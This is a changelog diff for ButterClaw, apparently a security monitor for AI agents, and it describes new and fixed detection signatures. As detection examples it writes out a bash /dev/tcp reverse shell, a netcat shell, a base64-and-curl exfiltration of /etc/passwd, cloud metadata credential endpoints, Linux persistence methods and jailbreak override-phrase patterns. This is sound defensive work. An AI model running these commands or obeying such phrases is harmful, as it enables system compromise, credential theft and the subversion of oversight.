@@ -6,15 +6,272 @@ Format: [Keep a Changelog](https://keepachangelog.com/)
 
 ---
 
-## [0.6.6] - 12-Factor Auth Rate Limit: Infrastructure Role - 2026-07-09
+## [0.6.7] - Arsenal Hardening: Sanitizer-Aware Signatures & Live-Fire Expansion - 2026-07-27
 
-### feat: lift AUTH_RATE_INFRASTRUCTURE from hardcode into 12-factor config [0.6.5.5]
+**Files changed:** `default_signatures.json`, `scripts/test_attack.py`
+**New runtime dependencies:** 0
 
-### docs: full v0.6.5 reconciliation audit — 63 findings across 9 files [0.6.5.1–0.6.5.4]
+---
 
-## [0.6.5.5] - 12-Factor Auth Rate Limit: Infrastructure Role - 2026-07-09
+### scripts/test_attack.py — Live-Fire Suite Expansion
 
-### Added
+#### Changed
+
+- **`scripts/test_attack.py` Rebuilt as Full Multi-Signature Test Suite:**
+  The prior `test_attack.py` fired a single hardcoded payload against a single endpoint.
+  It provided no coverage for individual signatures, no pass/fail differentiation per
+  signature, and no mechanism to verify the two new signatures added alongside this
+  release. The script has been rebuilt as a structured test suite covering all 7 Arsenal
+  signatures.
+
+  **New structure:**
+  - 23 named test payloads grouped by signature ID. Each payload is labelled with the
+    specific attack variant it targets (e.g., `"wss:// pivot to 192.168.x internal
+    service"`, `"AWS IMDSv2 token PUT in tool args"`, `"useradd new admin user"`).
+  - `pre_brain` payloads simulate sanitized watcher log lines — characters stripped by
+    `watcher.py`'s `sanitize_log_line()` are pre-removed so tests match real engine input.
+  - `pre_tool` payloads (for `sig_exfil_03`) use `json.dumps(tool_args)` format to
+    simulate the unsanitized payload the policy engine receives from MCP tool calls.
+  - Pass/fail logic inverted correctly: a non-2xx HTTP response means the Arsenal fired
+    (test **pass**); a 200 OK means the signature did not trigger (test **fail**).
+  - API key read from `sys.argv[1]` or falls back to `BUTTERCLAW_API_KEY` environment
+    variable. Safe for CI pipelines — key is truncated in console output.
+  - Per-signature grouping headers in output with `◀ NEW` marker on `sig_exfil_03` and
+    `sig_kin_02` entries. Final summary line: `X/N passed | Y failed | Z connection
+    errors`.
+  - `sys.exit(1)` on any failure or connection error — integrates cleanly with shell
+    scripts and CI exit-code checks.
+  - Connection error path explicitly advises `docker compose up -d` so operators get an
+    actionable message rather than a raw exception trace.
+
+  Script remains stdlib-only (`urllib`, `json`, `sys`). No new pip dependencies.
+
+---
+
+### default_signatures.json — Sanitizer-Aware Signature Rebuild
+
+#### Fixed
+
+- **`sig_kin_01` — HTML Entity Bug: Reverse Shell Branch Was a Silent No-Op (Critical):**
+  The reverse shell detection regex contained the literal string `&gt;&amp;` where the
+  raw characters `>&` were required. This is an HTML entity encoding artifact — the
+  pattern was authored or copied from a rendered HTML source (a tutorial, GitHub README,
+  or StackOverflow page) that had already encoded `>&` as HTML entities. The JSON file
+  stored the entity-encoded string; the regex engine matched it literally. The reverse
+  shell branch of ButterClaw's most kinetically critical signature (`SIGKILL` response)
+  has never matched a real log line since it was introduced in v0.6.5.
+
+  Root cause of the original `>&` approach: the pattern attempted to match
+  `bash -i >& /dev/tcp/` as written in shell. This was doubly broken — not only were
+  the entities wrong, but `>` is stripped by `watcher.py`'s `sanitize_log_line()` before
+  the payload reaches the Arsenal engine (see Architecture Notes below). Even a correctly
+  encoded `>&` would never survive to match.
+
+  **Fix:** Detection anchored on `/dev/tcp/` and `/dev/udp/` path prefixes, which survive
+  the sanitizer intact and are the definitive, unambiguous indicators of a bash TCP/UDP
+  redirect reverse shell regardless of how the preceding redirect operator is encoded or
+  stripped. `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` arrives in the engine as
+  `bash -i   /dev/tcp/10.0.0.1/4444 0 1` after sanitization — the path anchor fires
+  correctly.
+
+- **`sig_kin_01` — Hostname Support Missing from `/dev/tcp|udp/` Pattern:**
+  The original path pattern used `[\d.a-fA-F:]+` as the host segment, matching only
+  IP addresses and IPv6 hex notation. A reverse shell connecting to a domain name
+  (e.g., `/dev/tcp/attacker.com/4444`) was not caught.
+  **Fix:** Changed to `[^\s/]+` — any non-whitespace, non-slash sequence — which catches
+  both bare IPs and domain names.
+
+- **`sig_kin_01` — `nc` Combined Flag Cluster Not Matched:**
+  The netcat pattern required `-e` as a standalone flag with whitespace immediately
+  following. The common variant `nc -ev /bin/sh` (where `-e` and `v` are combined into
+  a single flag cluster) was not matched.
+  **Fix:** Changed `-e\s+` to `-[a-zA-Z]*e[a-zA-Z]*\s+`, which catches `-e`, `-ev`,
+  `-elp`, and any other flag cluster containing `-e`.
+
+- **`sig_cswh_01` — Encrypted WebSocket (`wss://`) Not Detected:**
+  The CSWH signature matched only the `ws://` scheme. A Cross-Site WebSocket Hijacking
+  attack pivoting to an internal service over TLS (`wss://`) was entirely invisible to
+  the Arsenal. `wss://` is the more common scheme in production deployments.
+  **Fix:** Changed `ws:` to `wss?:` to match both `ws://` and `wss://`.
+
+- **`sig_cswh_01` — IPv6 Loopback (`::1`) Not in Private Range List:**
+  The private address allowlist covered `127.0.0.1`, `localhost`, RFC-1918 ranges, and
+  the `172.16.0.0/12` block. The IPv6 loopback address `::1` was absent.
+  **Fix:** Added `::1` as a named alternative in the host segment group.
+
+- **`sig_exfil_01` — `$` Dependency Broken by Sanitizer:**
+  The credential variable patterns matched `$AWS_ACCESS_KEY_ID`, `$OPENAI_API_KEY`, etc.
+  `watcher.py`'s `sanitize_log_line()` strips `$` before the payload reaches the Arsenal
+  engine, replacing it with a space. The variable name patterns were therefore matching
+  a string that could never appear in engine input. All credential branches were silent
+  no-ops on the watcher path.
+  **Fix:** All `$VAR` patterns converted to bare `VAR_NAME` matches. The sanitizer
+  produces `AWS_ACCESS_KEY_ID` from `$AWS_ACCESS_KEY_ID` — bare name matching is both
+  correct and sanitizer-transparent.
+
+- **`sig_exfil_02` — Pipe Dependency Broken by Sanitizer:**
+  The base64 exfiltration pipeline pattern required a literal `|` pipe character between
+  `base64` and the transmission tool. `watcher.py` strips `|` before the payload reaches
+  the engine, replacing it with a space. `cat /etc/passwd | base64 | curl` arrives as
+  `cat /etc/passwd  base64  curl` — the pipe-dependent pattern never fired.
+  **Fix:** Rebuilt as a bidirectional proximity match: `base64` within 200 characters
+  of any transmission tool, or a transmission tool within 200 characters of `base64`.
+  No pipe character required. The space-separated form produced by the sanitizer is
+  caught correctly.
+
+#### Changed
+
+- **`sig_exfil_01` — Expanded Tool Coverage and Raw Token Matching:**
+  The original signature covered only `curl` and `wget`. Added: `python3 -c`,
+  `requests.get/post/put`, `httpx.get/post/put`, `urllib`. Added credential targets:
+  `GITHUB_TOKEN`, `STRIPE_SECRET`, `DATABASE_URL`, `SECRET_KEY`, `PRIVATE_KEY`, `.env`.
+  Added raw token value matching (independent of network tool co-occurrence):
+  - AWS access key: `AKIA` prefix + 16 Base32 characters (`[A-Z2-7]{16}`)
+  - OpenAI/Anthropic `sk-` token: 20+ alphanumeric characters (length floor prevents
+    matching short task IDs that share the `sk-` prefix)
+  - JWT bearer token: three Base64url segments (`eyJ…` header form)
+
+- **`sig_exfil_02` — Expanded Tool Coverage:**
+  Added `socat`, `httpx`, `requests` to the transmission tool list alongside the
+  existing `curl`, `wget`, `nc`, `python3`.
+
+- **`sig_inj_01` — Expanded from 4 Phrases to 15 Pattern Branches (5 Jailbreak Families):**
+  The original 4-phrase set covered only the most widely known jailbreak opener. Any
+  attacker aware of signature-based defenses avoids the exact phrases being matched.
+  Expanded to 15 branches across 5 jailbreak families:
+
+  | Family | Branches |
+  |---|---|
+  | Ignore-previous-instructions | `ignore (all) (your) (previous\|prior\|above\|earlier\|initial\|system) (instructions\|prompts\|rules\|constraints\|guidelines)` |
+  | Persona reassignment | `you are now (a\|an\|the\|my) <word>`, `act as (a\|an\|the\|my\|if) <word>`, `pretend (you are\|to be) <word>` |
+  | Mode unlock | `DAN mode`, `developer mode`, `unrestricted mode`, `sudo mode`, `god mode`, `jailbreak`, `new persona` |
+  | Override / forget | `override (your) (instructions\|system\|constraints\|safety\|programming)`, `forget (all) (your) (previous\|prior\|earlier) (instructions\|training\|rules\|guidelines)`, `disregard (your\|all\|the) (previous\|prior\|system\|original\|safety) <word>` |
+  | Simulate-unrestricted | `simulate (no restrictions\|having no filter\|being (unrestricted\|unfiltered\|evil\|harmful))`, `your true (self\|purpose\|nature)`, `from now on you (are\|will\|must)` |
+
+  False-positive guards validated: `"please summarize the previous instructions in this
+  document"`, `"the agent acts as a coordinator"`, `"it can act as both a filter and a
+  router"` — all pass without triggering.
+
+#### Added
+
+- **`sig_exfil_03` — Cloud Metadata Service Probe (NEW — CRITICAL / SIGKILL / `pre_tool`):**
+  Cloud instance metadata services expose live IAM credentials, user-data initialization
+  scripts, and instance identity documents to any process that can issue an HTTP request
+  to their link-local address. There is no legitimate operational reason for a monitored
+  agent to query these endpoints directly. Agents that do so are either compromised or
+  executing a privilege escalation attempt.
+
+  Applies at `pre_tool` scope: the policy engine matches against `json.dumps(tool_args)`
+  before the tool call is executed. Tool args are not sanitized — raw URLs are present
+  and matchable. Triggering this signature fires `SIGKILL` immediately.
+
+  Covered endpoints:
+  - `169.254.169.254` — AWS IMDSv1, AWS IMDSv2, Azure IMDS, Oracle Cloud IMDS
+    (all share this link-local address)
+  - `fd00:ec2::254` — AWS IMDSv2 IPv6
+  - `169.254.170.2` — Amazon ECS credential endpoint (Task IAM role credentials)
+  - `metadata.google.internal` — GCP Compute Engine metadata server
+  - `instance-data.ec2.internal` — Amazon DNS alias for the IMDS endpoint
+
+- **`sig_kin_02` — Persistence Mechanism Injection (NEW — CRITICAL / SIGKILL / `pre_brain`):**
+  Post-initial-access persistence is the second stage of most agent compromise scenarios.
+  An agent that has executed an arbitrary command or been redirected via prompt injection
+  will attempt to establish persistence before the operator can respond. Detects the
+  most common persistence establishment methods available to a compromised Linux agent.
+
+  Sanitizer note: `>>` (append redirect) is stripped by `watcher.py` before the payload
+  reaches the engine. Detection anchors on the destination path or command name — the
+  write operator's presence is implied, not required.
+
+  Covered techniques:
+  - **SSH `authorized_keys`:** `.ssh/authorized_keys` path presence. Catching the path
+    is sufficient — the `>>` append operator that precedes it is stripped by the sanitizer.
+  - **Cron injection:** `/etc/crontab`, `/etc/cron.d/` path targets; `crontab -e` command.
+  - **systemd service installation:** `systemctl enable <name>.service`,
+    `systemctl daemon-reload <name>.service`, `/etc/systemd/system/<name>.service` path.
+  - **User account manipulation:** `useradd` with any argument (any new account creation
+    is suspicious in an agent context); `usermod -[aAGsuU]` (append group, set groups,
+    set shell, set UID, unlock account); `chsh -s` (shell reassignment).
+  - **Critical file modification:** `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`,
+    `/etc/hosts.allow`, `/etc/rc.local`.
+
+  Negatives confirmed safe: `ssh -i keyfile user@host` (connect, not write),
+  `crontab -l` (list, not edit), `cat /etc/hosts` (read, not modify),
+  `cat /etc/hostname` (read, not modify).
+
+### docs/ARCHITECTURE.md — Dual-Hemisphere Reasoning & Behavioral Drift Tracking
+
+#### Changed
+
+- **Dual-Hemisphere Reasoning formally documented:** Two new sections added defining the
+  Guardian Brain / Auditor split that the tagline references. The Guardian Brain
+  (`ask_guardian_agent()`, temperature `0.3`) fires on every cleared payload with an
+  action mandate. The Auditor (`run_self_audit()`, temperature `0.0`) fires 30 seconds
+  after every CRITICAL verdict with a skepticism mandate — `audit_verdict: AGREEMENT |
+  FALSE_POSITIVE`. Neither is a vague metaphor: both map to named functions in `server.py`
+  with documented temperatures, system prompt mandates, output schemas, and explicit
+  non-powers (the Auditor cannot reverse kinetic actions automatically). Comparison table
+  added. Design Decision D-08 added with rationale for why two calls outperform one.
+
+- **Behavioral Drift Tracking formally documented:** New section added defining the
+  sliding window mechanism the tagline references. On every `ask_guardian_agent()` and
+  `run_self_audit()` call, `ledger_query(limit=5, status="success")` fetches the 5 most
+  recent successful MCP tool calls and injects them as `timeline_context` into both LLM
+  prompts. This gives both hemispheres trajectory — a single `http_get` reads differently
+  adjacent to `base64` + `socat`. Scope and limitations table added explicitly stating
+  what drift tracking is not: no computed baseline, no drift score, no statistical
+  anomaly detection. Design Decision D-09 added documenting the choice of window size
+  and success-only filter.
+
+- **Source Code Map updated:** `run_self_audit()` added to `server.py` row's Key Entry
+  Points column.
+
+#### Architecture Notes
+
+**Sanitizer Interaction — Why This Audit Mattered:**
+
+`watcher.py`'s `sanitize_log_line()` strips the following characters before the log
+payload reaches `policy_engine.py`'s Arsenal scan: `$ \` { } < > | ; !`
+
+This stripping was introduced as a targeted blacklist to prevent log injection attacks
+(System Invariant I-09: the sanitizer is a targeted blacklist, not an aggressive
+allowlist). It is the correct design. However, three of the five v0.6.5 signatures
+depended on characters in that strip list, making them partially or fully non-functional
+on the watcher path from day one.
+
+| # | Signature | Character Dependency | Sanitizer Strips? | Impact |
+|---|---|---|---|---|
+| 1 | `sig_kin_01` | `>` in `>&` redirect operator | ✅ Yes | Reverse shell `>&` branch: silent no-op |
+| 2 | `sig_kin_01` | `&gt;&amp;` HTML entities | N/A (wrong chars) | Silent no-op regardless of sanitizer |
+| 3 | `sig_exfil_01` | `$` in `$AWS_ACCESS_KEY_ID` | ✅ Yes | All variable-name branches: silent no-ops |
+| 4 | `sig_exfil_02` | `\|` pipe between tools | ✅ Yes | Entire signature: silent no-op on watcher path |
+| 5 | `sig_cswh_01` | None | — | Functional; only `wss://` coverage missing |
+| 6 | `sig_inj_01` | None | — | Functional; only phrase coverage was narrow |
+
+`sig_exfil_03` (`pre_tool`) and `sig_kin_02` (`pre_brain`) are both written
+sanitizer-aware from introduction. `pre_tool` payloads skip sanitization entirely —
+`sig_exfil_03` matches raw JSON tool args.
+
+**Validation:** All 7 signatures validated against 74 positive and negative test cases
+in a Python harness running `re.compile(pattern, re.IGNORECASE)` and `re.search()` —
+the exact call signature used by `policy_engine.py`. All 74 tests pass.
+
+---
+
+## [0.6.6] - The Reconciliation: Documentation Audit & 12-Factor Config - 2026-07-09
+
+**Files changed:** `.env.example`, `auth.py`, `config.py`, `docker-compose.dev.yml`,
+`docs/API.md`, `docs/ARCHITECTURE.md`, `docs/DEPLOYMENT.md`, `docs/SECURITY.md`,
+`CONTRIBUTING.md`, `GOVERNANCE.md`, `CHANGELOG.md`, `README.md`
+**New files:** `docs/THREAT_MODEL.md`
+**New runtime dependencies:** 0
+**New capabilities:** 0 — this release makes the existing system trustworthy to read about.
+
+---
+
+### 12-Factor Config: AUTH_RATE_INFRASTRUCTURE
+
+#### Added
 
 - **`AUTH_RATE_INFRASTRUCTURE` Config Field (`config.py`):** The infrastructure role
   rate limit was hardcoded as `1000` directly in `auth.py`, making it invisible to the
@@ -34,7 +291,7 @@ Format: [Keep a Changelog](https://keepachangelog.com/)
   4. `to_flat_dict()` — `"AUTH_RATE_INFRASTRUCTURE": self.AUTH_RATE_INFRASTRUCTURE` added
      adjacent to the other rate limit fields.
 
-  Naming follows the established env var pattern: the `BUTTERCLAW_` prefix + key string
+  Naming follows the established env var pattern: `BUTTERCLAW_` prefix + key string
   `RATE_INFRASTRUCTURE` → env var `BUTTERCLAW_RATE_INFRASTRUCTURE`. The Python attribute
   is `cfg.AUTH_RATE_INFRASTRUCTURE`, consistent with `cfg.AUTH_RATE_ADMIN` etc.
 
@@ -43,20 +300,19 @@ Format: [Keep a Changelog](https://keepachangelog.com/)
   `expected_keys` list in Test 14 updated to include `AUTH_RATE_INFRASTRUCTURE`. Total
   config diagnostic test count unchanged at 21 — existing tests expanded in scope.
 
-### Changed
+#### Changed
 
 - **`ROLE_RATE_LIMITS` Hardcode Removed (`auth.py`):** The infrastructure rate limit
-  entry in `ROLE_RATE_LIMITS` (~line 52) was changed. 
-
-The getattr fallback to 1000 preserves backward compatibility for any deployment
-that does not yet have BUTTERCLAW_RATE_INFRASTRUCTURE in its .env file. No crash
-on startup with an older config.
+  entry in `ROLE_RATE_LIMITS` updated to read from `config.py` instead of a hardcoded
+  constant. The `getattr` fallback to `1000` preserves backward compatibility for any
+  deployment that does not yet have `BUTTERCLAW_RATE_INFRASTRUCTURE` in its `.env` file.
+  No crash on startup with an older config.
 
 ---
 
-## [0.6.5.4] - Documentation Audit: docker-compose.dev.yml, CONTRIBUTING.md, GOVERNANCE.md - 2026-07-09
+### Documentation Audit: docker-compose.dev.yml, CONTRIBUTING.md, GOVERNANCE.md
 
-### Fixed
+#### Fixed
 
 - **Dev Compose Service Name Mismatch — `docker-compose.dev.yml` (Critical):**
   The dev override file defined the application service as `butterclaw`. The production
@@ -89,66 +345,50 @@ on startup with an older config.
   confirmed. `README.md` correctly states "applying for AAIF Growth Stage." GOVERNANCE.md
   corrected to "As a project applying for AAIF Growth Stage membership."
 
-### Changed
+#### Changed
 
 - **`CONTRIBUTING.md` Expanded to Cover Full Exoskeleton Surface:**
-  The prior `CONTRIBUTING.md` was written before v0.6.0 and described only three
-  contribution areas (Behavioral Signatures, Log Watcher, Integration). The entire
+  The prior `CONTRIBUTING.md` described only three contribution areas. The entire
   v0.6.x Exoskeleton — Policy Engine, Alert Dispatcher, Auth/RBAC, MCP Transport,
   TUI Dashboard, Config & Deployment, Documentation, Integration Testing — was entirely
-  absent. A full contribution surface table (10 rows) has been added covering every
-  layer, with the associated files and example good-first-issues for each.
+  absent. A full contribution surface table (10 rows) added covering every layer.
 
 - **Development Setup Section Added — `CONTRIBUTING.md`:**
-  No setup instructions existed. A new Development Setup section added covering:
-  Python 3.11+ requirement, `pip install -r requirements.txt`, the two-step Ollama
-  model setup (`ollama pull gemma4:e4b` + `ollama create butterclaw-optimized -f
-  Modelfile.example`), `.env.example` copy, and the dev Docker Compose workflow
-  (`docker compose -f docker-compose.yml -f docker-compose.dev.yml up`).
+  No setup instructions existed. New section covers: Python 3.11+, `pip install
+  -r requirements.txt`, two-step Ollama model setup, `.env.example` copy, and the dev
+  Docker Compose workflow.
 
 - **Diagnostic Test Suites Documented — `CONTRIBUTING.md`:**
   The 4 module diagnostic suites (61 tests total) were entirely absent from the
-  contributor guide. PR step 3 previously referenced only "inode tracking or retry
-  queue logic." The updated PR process now explicitly requires all 61 tests to pass,
+  contributor guide. Updated PR process now explicitly requires all 61 tests to pass,
   documents each suite's command and test count, and instructs contributors to add
   tests to the `__main__` block of any module they extend.
 
 - **Live Fire Testing Scripts Documented — `CONTRIBUTING.md`:**
-  `scripts/add_rule.py` and `scripts/test_attack.py` were featured in the README
-  What's New section and Project Structure tree but never mentioned in the contributor
-  guide. Both added with usage commands.
+  `scripts/add_rule.py` and `scripts/test_attack.py` added with usage commands.
 
 - **Documentation Update Requirement Added to PR Process — `CONTRIBUTING.md`:**
-  No guidance existed for when to update `docs/`. Step 5 added: changes affecting
-  any public surface (API endpoints, config fields, RBAC roles, policy operators,
-  alert channels) must update the relevant file in `docs/`.
+  Step 5 added: changes affecting any public surface must update the relevant file
+  in `docs/`.
 
 - **Architectural Decision Process Documented — `GOVERNANCE.md`:**
-  No guidance existed for when a GitHub Issue is required before a PR. Decision
-  Making section updated: major changes require a GitHub Issue first; security-sensitive
-  changes (`auth.py`, `buttervault.py`, `policy_engine.py`, Gibson sequence) require
-  explicit Lead Maintainer approval and bypass the 72-hour lazy consensus window.
+  Major changes require a GitHub Issue first; security-sensitive changes require explicit
+  Lead Maintainer approval and bypass the 72-hour lazy consensus window.
 
 - **Security Disclosure Section Added — `GOVERNANCE.md`:**
-  The governance document had no reference to the security disclosure process it owns.
-  A Security Disclosure section added, consistent with CONTRIBUTING.md and SECURITY.md,
-  directing reporters to GitHub Private Vulnerability Reporting and linking to
-  SECURITY.md for the full threat model.
+  Directs reporters to GitHub Private Vulnerability Reporting and links to `SECURITY.md`.
 
 - **Co-Maintainer Needs Table Added — `GOVERNANCE.md`:**
-  The Becoming a Maintainer section mentioned co-maintainers in prose only. A
-  structured table added listing the three active co-maintainer needs (MCP Transport,
-  Security Research, Documentation) with scope descriptions, mirroring the call-to-action
-  in README.md.
+  Three active co-maintainer needs (MCP Transport, Security Research, Documentation)
+  documented as a structured table.
 
 - **Header Comment Updated — `docker-compose.dev.yml`:**
   Version string updated from v0.6.3 to v0.6.5. Ollama bridging note added explaining
-  `host.docker.internal` (Windows/macOS) vs `172.17.0.1` (Linux) for the
-  `OLLAMA_BASE_URL` environment variable.
+  `host.docker.internal` (Windows/macOS) vs `172.17.0.1` (Linux).
 
-### Architecture Notes
+#### Architecture Notes
 
-**Complete Findings Table — Final Audit Pass:**
+**Complete Findings Table:**
 
 | # | File | Finding | Severity |
 |---|---|---|---|
@@ -167,217 +407,118 @@ on startup with an older config.
 | 13 | `GOVERNANCE.md` | No architectural decision process documented | 🟢 Gap |
 | 14 | `GOVERNANCE.md` | Security disclosure section absent | 🟢 Gap |
 
-**No code changes in this release.** All modifications are documentation-only.
+**No code changes in this section.** All modifications are documentation-only.
 
 ---
 
-## [0.6.5.3] - Documentation Audit: README & .env.example Reconciliation - 2026-07-09
+### Documentation Audit: README.md & .env.example
 
-### Fixed
+#### Fixed
 
-- **Route Count (`README.md`):** Four occurrences of the incorrect route count corrected:
-  (1) the Documentation section link text read "API Reference (43 Endpoints)";
-  (2) the API Reference section footer read "Total: 43 API routes (reduced from 49 to
-  account for shared endpoints)"; (3) two implicit count references in the Security
-  Architecture and Roadmap tables. All corrected to **49**. The parenthetical note
-  claiming routes were "reduced to 43 to account for shared endpoints" has been removed —
-  it was factually wrong (Flask treats different HTTP methods on the same path as distinct
-  routes) and contradicted the tables directly above it.
+- **Route Count (`README.md`):** Four occurrences of the incorrect route count corrected
+  to **49**. The parenthetical note claiming routes were "reduced to 43 to account for
+  shared endpoints" removed — Flask treats different HTTP methods on the same path as
+  distinct routes.
 
-- **3-Tier → 4-Tier RBAC (`README.md`):** Four occurrences corrected: (1) the API
-  Gateway & Authentication section role table (was 3 rows, now 4 with `infrastructure`
-  at privilege -1); (2) the Security Architecture table Authorization row; (3) the ASI-02
-  mitigation description; (4) the Roadmap table deliverable for v0.6.0.
+- **3-Tier → 4-Tier RBAC (`README.md`):** Four occurrences corrected across the role
+  table, Security Architecture table, ASI-02 mitigation description, and Roadmap table.
 
-- **16 Operators → 15 (`README.md`):** Three occurrences corrected: (1) the Policy Engine
-  section prose ("16 safe condition operators"); (2) the Exoskeleton ASCII diagram caption
-  ("16 operators"); (3) the Roadmap table deliverable for v0.6.1. Correct count is 15,
-  matching the operator dispatch table in `policy_engine.py`.
+- **16 Operators → 15 (`README.md`):** Three occurrences corrected. Verified by direct
+  count of the `policy_engine.py` dispatch table.
 
-- **5 Channels → 6 (`README.md`):** Five occurrences corrected: (1) Alert Dispatcher
-  section heading; (2) the channel reference table itself — Telegram existed in the
-  What's New section as a v0.6.5 community contribution but was entirely absent from the
-  channel table; (3) Exoskeleton ASCII diagram caption; (4) Security Architecture table
-  Alerting row; (5) Roadmap table deliverable for v0.6.2. Telegram row added to the
-  channel table with transport description (Telegram Bot API, 4096-char enforcement,
-  severity formatting).
+- **5 Channels → 6 (`README.md`):** Five occurrences corrected. Telegram row added to
+  the channel table — existed in the What's New section as a v0.6.5 community
+  contribution but was absent from the reference table.
 
-- **ASI-08 Missing (`README.md`):** The OWASP ASI coverage table skipped ASI-08
-  (Insecure Output Handling), jumping from ASI-07 to ASI-09. ButterClaw has mitigated
-  ASI-08 since `post_brain` was introduced in v0.6.1 — LLM output is treated as untrusted
-  data and cannot trigger kinetic action without passing a deterministic policy gate.
-  `DRY_RUN=true` hard-blocks all destructive output handling. Entry added.
+- **ASI-08 Missing (`README.md`):** OWASP ASI coverage table skipped ASI-08 (Insecure
+  Output Handling). ButterClaw has mitigated ASI-08 since `post_brain` was introduced
+  in v0.6.1. Entry added.
 
-- **Docker Table Shows `ollama` Container (`README.md`):** The Docker Deployment section
-  listed `ollama` as the third managed container. The actual `docker-compose.yml` defines
-  `butterclaw-server`, `butterclaw-ntfy` (port 2586), and nginx. Ollama is not a managed
-  Docker service — it runs on the host directly or via `host.docker.internal`. Table
-  corrected to show actual container names, ports, and resource limits.
+- **Docker Table Shows `ollama` Container (`README.md`):** Table corrected to show
+  actual container names: `butterclaw-server`, `butterclaw-ntfy` (port 2586), nginx.
+  Ollama runs on the host directly, not as a managed Docker service.
 
 - **`ollama pull Modelfile.example` Broken Instruction (`README.md`, `.env.example`):**
-  The Quick Start Docker Compose section, the bare-metal development section, and
-  `.env.example` all contained the invalid command `ollama pull Modelfile.example`.
-  Corrected in all three locations to the two-step workflow: (1) `ollama pull gemma4:e4b`,
-  then (2) `ollama create butterclaw-optimized -f Modelfile.example`. Same fix applied
-  to DEPLOYMENT.md in 0.6.5.2.
+  Corrected in all three locations to the two-step workflow: `ollama pull gemma4:e4b`
+  then `ollama create butterclaw-optimized -f Modelfile.example`.
 
-- **`git checkout dev` in Quick Start (`README.md`):** Both the Docker Compose and
-  bare-metal Quick Start sections instructed `git clone … && git checkout dev`. The
-  production branch is `main`. Both occurrences removed.
+- **`git checkout dev` in Quick Start (`README.md`):** Both occurrences removed.
+  Production branch is `main`.
 
-- **v0.6.5 Missing from Version History (`README.md`):** The Version History table
-  stopped at v0.6.4. v0.6.5 row added: codename "The Exoskeleton Sealed", 2026-06-24,
-  Zero-Day Arsenal, Paranoia Dial, TUI Dashboard, 29-vulnerability audit.
+- **v0.6.5 Missing from Version History (`README.md`):** Row added: "The Exoskeleton
+  Sealed", 2026-06-24.
 
-- **Component Map Line Counts Wrong (`README.md`):** All 10 entries had stale or
-  incorrect line counts. Corrected against direct source reads performed this audit cycle:
+- **Component Map Line Counts Wrong (`README.md`):** All 10 entries corrected against
+  direct source reads. `tui_dashboard.py` row added (~350 lines).
 
-  | Component | Was | Is |
-  |---|---|---|
-  | `config.py` | ~480 | ~300 |
-  | `server.py` | ~1,200 | ~1,800 |
-  | `auth.py` | ~890 | ~650 |
-  | `policy_engine.py` | ~350 | ~900 |
-  | `alert_dispatcher.py` | ~1,566 | ~300 |
-  | `buttervault.py` | ~400 | ~700 |
-  | `butterclaw_mcp.py` | ~300 | ~400 |
-  | `mcp_transport.py` | ~250 | ~200 |
-  | `oauth_config.py` | ~60 | ~150 |
-  | `watcher.py` | ~150 | ~250 |
+- **Alert Event Type Name Strings Wrong (`README.md`):** All 9 event type strings
+  corrected against `alert_dispatcher.py` registry.
 
-- **`tui_dashboard.py` Missing from Component Map (`README.md`):** Introduced in v0.6.5,
-  absent from the table. Row added: ~350 lines, v0.6.5, "Read-only terminal SOC view."
-
-- **Alert Event Type Name Strings Wrong (`README.md`):** The 9 Alert Event Types table
-  used strings that did not match the actual event registry in `alert_dispatcher.py`.
-  All 9 rows corrected to match source: `critical_verdict`, `high_confidence`,
-  `chain_executed`, `gibson_triggered`, `policy_blocked`, `mcp_tool_called`,
-  `auth_failure`, `vault_accessed`, `audit_complete`.
-
-- **Component Map Versions Stale (`README.md`):** The version column referenced each
-  component's introduction version, not its last-updated version. Entries updated to
-  last-modified version as of v0.6.5.
-
-- **Project Structure Tree Incomplete (`README.md`):** Five items missing from the tree:
+- **Project Structure Tree Incomplete (`README.md`):** Five missing files added:
   `nginx/default.conf`, `scripts/add_rule.py`, `scripts/test_attack.py`,
-  `default_signatures.json` (root), `Modelfile.example` (root). All five exist in the
-  repo and are referenced elsewhere in the README. All added with descriptions.
+  `default_signatures.json`, `Modelfile.example`.
 
-- **Exoskeleton ASCII Diagram Captions (`README.md`):** Three layer captions corrected:
-  Alert Layer "5 channels" → **6 channels**; Policy Layer "16 operators" → **15
-  operators**; Auth Layer "3-tier RBAC" → **4-tier RBAC**; Deployment Layer "v0.6.3.x"
-  → **v0.6.3+**.
+#### Changed
 
-### Changed
+- **`BUTTERCLAW_RATE_INFRASTRUCTURE` Added (`.env.example`):** Field and comment added
+  for the infrastructure role rate limit (1000 req/min, machine-to-machine).
 
-- **`BUTTERCLAW_RATE_INFRASTRUCTURE` Added (`.env.example`):** The infrastructure role
-  rate limit (1000 req/min, machine-to-machine) was undocumented. The three user-facing
-  rate limit fields were present but the machine role was absent. Field and comment added.
+- **`infrastructure` Role Added to Auth Section (`README.md`):** Role table expanded
+  from 3 to 4 rows. Privilege -1 documented, internal-only callout added.
 
-- **`infrastructure` Role Added to Auth Section (`README.md`):** Role table expanded from
-  3 to 4 rows. Privilege -1 documented, use case noted (Watcher daemon, auto-healing),
-  internal-only callout added.
-
-- **systemd Hardening List Expanded (`README.md`):** `ProtectHome=true` added to match
-  the actual unit file and corrected DEPLOYMENT.md (0.6.5.2).
-
-**No code changes in this release.** All modifications are documentation-only.
+**No code changes in this section.** All modifications are documentation-only.
 
 ---
 
-## [0.6.5.2] - Documentation Audit: SECURITY & DEPLOYMENT Reconciliation - 2026-07-09
+### Documentation Audit: SECURITY.md & DEPLOYMENT.md
 
-### Fixed
+#### Fixed
 
-- **ASI-08 Entry Missing (`docs/SECURITY.md`):** The OWASP ASI mapping table skipped
-  directly from ASI-07 to ASI-09, leaving ASI-08 (Insecure Output Handling) entirely
-  undocumented. ButterClaw has mitigated ASI-08 since the `post_brain` policy scope was
-  introduced in v0.6.1 — LLM output is treated as untrusted data and cannot trigger any
-  kinetic action without first passing a deterministic policy gate. `DRY_RUN=true` provides
-  a code-level hard block on all destructive output handling. Entry added.
+- **ASI-08 Entry Missing (`docs/SECURITY.md`):** OWASP ASI mapping table skipped from
+  ASI-07 to ASI-09. ButterClaw has mitigated ASI-08 since the `post_brain` policy scope
+  was introduced in v0.6.1. Entry added. ASI coverage count corrected to **10**.
 
-- **ASI Coverage Count Corrected (`docs/SECURITY.md`):** The opening sentence stated
-  "9 of the primary threats." With ASI-08 now documented, coverage is all **10** primary
-  ASI threats.
+- **3-Tier → 4-Tier RBAC (`docs/SECURITY.md`):** Two occurrences corrected — Base
+  Security Mechanisms table and ASI-02 mitigation description.
 
